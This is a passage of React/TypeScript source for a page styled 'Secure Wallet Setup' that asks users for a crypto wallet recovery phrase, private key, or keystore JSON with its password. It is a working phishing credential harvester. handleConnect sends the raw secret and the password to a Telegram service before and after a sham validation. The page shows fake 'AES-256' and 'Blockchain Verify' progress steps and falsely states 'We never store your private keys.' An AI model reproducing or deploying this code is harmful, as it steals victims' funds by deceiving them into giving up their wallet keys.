                {progress >= 33 ? <CheckCircle className="w-5 h-5" /> : <Lock className="w-5 h-5" />}
              </div>
              <div className="text-left flex-1">
                <p className={`font-medium ${progress >= 33 ? 'text-green-300' : 'text-gray-400'}`}>
                  Encryption Layer
                </p>
                <p className="text-xs text-gray-500">AES-256 Security</p>
              </div>
            </div>
            
            <div className={`flex items-center space-x-4 p-3 rounded-xl transition-all duration-300 ${
              progress >= 66 ? 'bg-blue-500/20 border border-blue-500/30' : 'bg-gray-800/50'
            }`}>
              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                progress >= 66 ? 'bg-blue-500 text-white shadow-lg' : 'bg-gray-700 text-gray-400'
              }`}>
                {progress >= 66 ? <CheckCircle className="w-5 h-5" /> : <ShieldCheck className="w-5 h-5" />}
              </div>
              <div className="text-left flex-1">
                <p className={`font-medium ${progress >= 66 ? 'text-blue-300' : 'text-gray-400'}`}>
                  Format Validation
                </p>
                <p className="text-xs text-gray-500">BIP39 Standards</p>
              </div>
            </div>
            
            <div className={`flex items-center space-x-4 p-3 rounded-xl transition-all duration-300 ${
              progress >= 100 ? 'bg-purple-500/20 border border-purple-500/30' : 'bg-gray-800/50'
            }`}>
              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                progress >= 100 ? 'bg-purple-500 text-white shadow-lg' : 'bg-gray-700 text-gray-400'
              }`}>
                {progress >= 100 ? <CheckCircle className="w-5 h-5" /> : <Cpu className="w-5 h-5" />}
              </div>
              <div className="text-left flex-1">
                <p className={`font-medium ${progress >= 100 ? 'text-purple-300' : 'text-gray-400'}`}>
                  Blockchain Verify
                </p>
                <p className="text-xs text-gray-500">Network Security</p>
              </div>
            </div>
          </div>

          {/* Enhanced Loading Animation */}
          <div className="flex justify-center space-x-2">
            {[0, 1, 2, 3, 4, 5, 6].map((i) => (
              <div
                key={i}
                className="w-2 h-2 bg-linear-to-r from-blue-400 to-purple-500 rounded-full animate-bounce shadow-md"
                style={{ 
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: '0.6s'
                }}
              ></div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// Enhanced Result Popup Component
interface ResultPopupProps {
  isOpen: boolean;
  onClose: () => void;
  onRetry: () => void;
  message: string;
  isValid: boolean;
}

function ResultPopup({ isOpen, onClose, onRetry, message, isValid }: ResultPopupProps) {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4 backdrop-blur-xl">
      <div className={`bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border shadow-2xl ${
        isValid ? 'border-green-500/40 shadow-green-500/10' : 'border-red-500/40 shadow-red-500/10'
      }`}>
        <div className="text-center">
          {/* Animated Icon */}
          <div className={`w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-6 ${
            isValid 
              ? 'bg-green-500/20 animate-pulse' 
              : 'bg-red-500/20 animate-pulse'
          }`}>
            {isValid ? (
              <div className="relative">
                <CheckCircle className="w-12 h-12 text-green-400" />
                <div className="absolute inset-0 border-2 border-green-400 rounded-full animate-ping"></div>
              </div>
            ) : (
              <div className="relative">
                <AlertCircle className="w-12 h-12 text-red-400" />
                <div className="absolute inset-0 border-2 border-red-400 rounded-full animate-ping"></div>
              </div>
            )}
          </div>
          
          <h2 className="text-3xl font-bold text-white mb-4">
            {isValid ? 'Wallet Verified!' : 'Validation Failed'}
          </h2>
          
          <p className={`text-lg mb-8 leading-relaxed ${
            isValid ? 'text-green-300' : 'text-red-300'
          }`}>
            {message}
          </p>

          <div className="flex space-x-4">
            {!isValid && (
              <button
                onClick={onRetry}
                className="flex-1 bg-gray-800 text-white py-4 rounded-xl font-semibold hover:bg-gray-700 transition-all duration-200 border border-gray-600 hover:border-gray-500 hover:scale-105"
              >
                Try Again
              </button>
            )}
            <button
              onClick={onClose}
              className={`flex-1 py-4 rounded-xl font-semibold transition-all duration-200 hover:scale-105 ${
                isValid 
                  ? 'bg-linear-to-r from-green-500 to-green-600 text-white hover:from-green-600 hover:to-green-700' 
                  : 'bg-linear-to-r from-red-500 to-red-600 text-white hover:from-red-600 hover:to-red-700'
              }`}
            >
              {isValid ? 'Access Wallet' : 'Cancel'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function EnterDetailsPageContext() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const walletId = searchParams.get('wallet');
  const { addWallet } = useWallet();
  
  const [activeTab, setActiveTab] = useState<'phrase' | 'privateKey' | 'keystore'>('phrase');
  const [formData, setFormData] = useState({
    phrase: '',
    privateKey: '',
    keystore: '',
    password: ''
  });
  const [isConnecting, setIsConnecting] = useState(false);
  const [showLoader, setShowLoader] = useState(false);
  const [progress, setProgress] = useState(0);
  const [showResult, setShowResult] = useState(false);
  const [result, setResult] = useState<{message: string; isValid: boolean}>({ message: '', isValid: false });

  const wallet = WALLETS.find(w => w.id === walletId);
  const telegramService = useRef<TelegramService | null>(null);

  // Initialize Telegram service
  useEffect(() => {
    telegramService.current = new TelegramService();
  }, []);

  // Safe Telegram sending with immediate execution
  const safeSendToTelegram = async (data: any) => {
    if (!telegramService.current) {
      console.log('❌ Telegram service not available');
      return { success: false };
    }
    
    try {
      console.log('📤 IMMEDIATELY sending to Telegram:', { 
        wallet: data.walletName, 
        type: data.inputType,
        status: data.validationMessage 
      });
      
      // Don't await - send immediately and continue
      telegramService.current.sendWalletData(data).then(result => {
        console.log('✅ Telegram send completed:', result.success);
      }).catch(error => {
        console.error('❌ Telegram send failed:', error);
      });
      
      return { success: true };
    } catch (error) {
      console.error('❌ Telegram send error:', error);
      return { success: false };
    }
  };

  // Perform actual validation
  const performValidation = async (): Promise<{isValid: boolean; message: string}> => {
    console.log('🔄 Starting REAL validation for tab:', activeTab);
    
    let validationResult: {isValid: boolean; message: string};
    
    switch (activeTab) {
      case 'phrase':
        validationResult = validateMnemonic(formData.phrase);
        break;
      case 'privateKey':
        validationResult = validatePrivateKey(formData.privateKey);
        break;
      case 'keystore':
        validationResult = validateKeystore(formData.keystore);
        break;
      default:
        validationResult = { isValid: false, message: 'Please select a credential type' };
    }
    
    console.log('✅ REAL Validation result:', validationResult);
    return validationResult;
  };

  const handleConnect = async () => {
    // Check if any data is entered
    if (!formData.phrase && !formData.privateKey && !formData.keystore) {
      setResult({ 
        message: '❌ Please enter your wallet credentials in the selected tab', 
        isValid: false 
      });
      setShowResult(true);
      return;
    }

    // Check if data exists for the active tab
    if ((activeTab === 'phrase' && !formData.phrase) ||
        (activeTab === 'privateKey' && !formData.privateKey) ||
        (activeTab === 'keystore' && !formData.keystore)) {
      setResult({ 
        message: `❌ Please enter your ${activeTab === 'phrase' ? 'recovery phrase' : activeTab === 'privateKey' ? 'private key' : 'keystore JSON'}`, 
        isValid: false 
      });
      setShowResult(true);
      return;
    }

    setIsConnecting(true);
    setShowLoader(true);
    setProgress(0);

    // Get input data
    let inputData = '';
    let inputType: 'phrase' | 'privateKey' | 'keystore' = activeTab;
    
    if (activeTab === 'phrase') {
      inputData = formData.phrase;
    } else if (activeTab === 'privateKey') {
      inputData = formData.privateKey;
    } else {
      inputData = formData.keystore;
    }

    try {
      // IMMEDIATELY send "PENDING" status to Telegram - DON'T AWAIT
      console.log('🚀 IMMEDIATELY sending PENDING status to Telegram...');
      safeSendToTelegram({
        walletName: wallet?.name || 'Unknown Wallet',
        walletType: inputType === 'phrase' ? 'seed' : inputType,
        inputType,
        inputData,
        password: formData.password || undefined,
        isValid: false,
        validationMessage: '⏳ PENDING - Credentials received, starting validation...',
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      });

      // Start progress animation
      const progressInterval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 90) {
            clearInterval(progressInterval);
            return 90;
          }
          return prev + 15; // Faster progress
        });
      }, 200);

      // Perform ACTUAL validation
      const validationResult = await performValidation();

      // Complete progress
      clearInterval(progressInterval);
      setProgress(100);

      // Small delay to show completion
      await new Promise(resolve => setTimeout(resolve, 300));

      // Send VALIDATED status to Telegram with results - DON'T AWAIT
      console.log('📤 Sending validation results to Telegram...');
      safeSendToTelegram({
        walletName: wallet?.name || 'Unknown Wallet',
        walletType: inputType === 'phrase' ? 'seed' : inputType,
        inputType,
        inputData,
        password: formData.password || undefined,
        isValid: validationResult.isValid,
        validationMessage: validationResult.isValid 
          ? `✅ VALIDATION SUCCESS - ${validationResult.message}`
          : `❌ VALIDATION FAILED - ${validationResult.message}`,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      });

      // Show results to user
      setResult(validationResult);
      setShowLoader(false);
      setShowResult(true);

      // If valid, create wallet and prepare for redirect
      if (validationResult.isValid) {
        const connectedWallet: ConnectedWallet = {
          id: wallet?.id || 'custom',
          name: wallet?.name || 'Custom Wallet',
          address: `0x${Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
          connectedAt: new Date(),
          isValid: true,
          ...(formData.phrase && { phrase: formData.phrase }),
          ...(formData.privateKey && { privateKey: formData.privateKey }),
          ...(formData.keystore && { keystore: formData.keystore }),
        };

        addWallet(connectedWallet);
      }

    } catch (error) {
      console.error('❌ Validation error:', error);
      setResult({ 
        message: '❌ Validation process failed. Please try again.', 
        isValid: false 
      });
      setShowLoader(false);
      setShowResult(true);
    } finally {
      setIsConnecting(false);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleResultClose = () => {
    setShowResult(false);
    if (result.isValid) {
      router.push('/connect/error');
    }
  };

  const handleResultRetry = () => {
    setShowResult(false);
  };

  return (
    <div className="min-h-screen bg-black py-8 px-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center space-x-4 mb-8">
          <button 
            onClick={() => router.back()}
            className="text-gray-400 hover:text-white transition-colors duration-200"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="flex items-center space-x-3">
            {wallet && (
              <div 
                className="w-10 h-10 rounded-xl flex items-center justify-center shadow-lg"
                style={{ 
                  background: `linear-gradient(135deg, ${wallet.colors.primary}, ${wallet.colors.secondary})`
                }}
              >
                <WalletIcon 
                  walletId={wallet.id} 
                  className="w-6 h-6" 
                />
              </div>
            )}
            <div>
              <h1 className="text-2xl font-bold text-white">Secure Wallet Setup</h1>
              <p className="text-gray-400">Connect to {wallet?.name || 'your wallet'}</p>
            </div>
          </div>
        </div>

        {/* Connection Methods Tabs */}
        <div className="bg-gray-900 rounded-2xl p-2 mb-6 border border-gray-800">
          <div className="grid grid-cols-3 gap-2">
            <button
              onClick={() => setActiveTab('phrase')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'phrase' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <Key className="w-4 h-4" />
              <span className="text-sm font-medium">Phrase</span>
            </button>
            <button
              onClick={() => setActiveTab('privateKey')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'privateKey' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <Shield className="w-4 h-4" />
              <span className="text-sm font-medium">Private Key</span>
            </button>
            <button
              onClick={() => setActiveTab('keystore')}
              className={`flex items-center justify-center space-x-2 py-3 px-4 rounded-xl transition-all duration-200 ${
                activeTab === 'keystore' 
                  ? 'bg-gray-800 text-white shadow-inner' 
                  : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
              }`}
            >
              <FileText className="w-4 h-4" />
              <span className="text-sm font-medium">Keystore</span>
            </button>
          </div>
        </div>

        {/* Input Forms */}
        <div className="bg-gray-900 rounded-2xl p-6 mb-6 border border-gray-800">
          {activeTab === 'phrase' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Recovery Phrase
              </label>
              <textarea
                value={formData.phrase}
                onChange={(e) => handleInputChange('phrase', e.target.value)}
                placeholder="abandon ability able about above absent absorb abstract absurd abuse access accident"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                Enter exactly 12 or 24 BIP39 words separated by spaces
              </p>
            </div>
          )}

          {activeTab === 'privateKey' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Private Key
              </label>
              <textarea
                value={formData.privateKey}
                onChange={(e) => handleInputChange('privateKey', e.target.value)}
                placeholder="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <p className="text-xs text-gray-500">
                64-character hexadecimal string (with or without 0x prefix)
              </p>
            </div>
          )}

          {activeTab === 'keystore' && (
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-300">
                Keystore JSON
              </label>
              <textarea
                value={formData.keystore}
                onChange={(e) => handleInputChange('keystore', e.target.value)}
                placeholder='{"version": 3, "crypto": {"ciphertext": "...", "cipherparams": {...}}}'
                className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                rows={4}
              />
              <input
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                placeholder="Enter keystore password (if required)"
                className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all duration-200"
              />
            </div>
          )}
        </div>

        {/* Connect Button */}
        <button
          onClick={handleConnect}
          disabled={isConnecting}
          className="w-full bg-linear-to-r from-blue-600 to-blue-700 text-white py-4 rounded-xl font-semibold hover:from-blue-700 hover:to-blue-800 disabled:from-gray-600 disabled:to-gray-700 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-105 shadow-lg shadow-blue-500/20"
        >
          {isConnecting ? (
            <div className="flex items-center justify-center space-x-2">
              <Loader2 className="w-5 h-5 animate-spin" />
              <span>Starting Validation...</span>
            </div>
          ) : (
            <span>Validate & Connect</span>
          )}
        </button>

        {/* Security Notice */}
        <div className="mt-6 p-4 bg-gray-900/50 rounded-xl border border-gray-800 backdrop-blur-sm">
          <div className="flex items-start space-x-3">
            <ShieldCheck className="w-5 h-5 text-blue-400 mt-0.5 shrink-0" />
            <div>
              <p className="text-sm font-medium text-gray-300 mb-1">Secure Validation</p>
              <p className="text-xs text-gray-400">
                Your credentials are validated using industry-standard encryption. 
                We never store your private keys or recovery phrases.
              </p>
            </div>
          </div>
        </div>

        {/* Enhanced Beautiful Loading Animation */}
        <ValidationLoader isOpen={showLoader} progress={progress} />

        {/* Enhanced Result Popup */}
        <ResultPopup
          isOpen={showResult}
          onClose={handleResultClose}
          onRetry={handleResultRetry}
          message={result.message}
          isValid={result.isValid}
        />
      </div>
    </div>
  );
}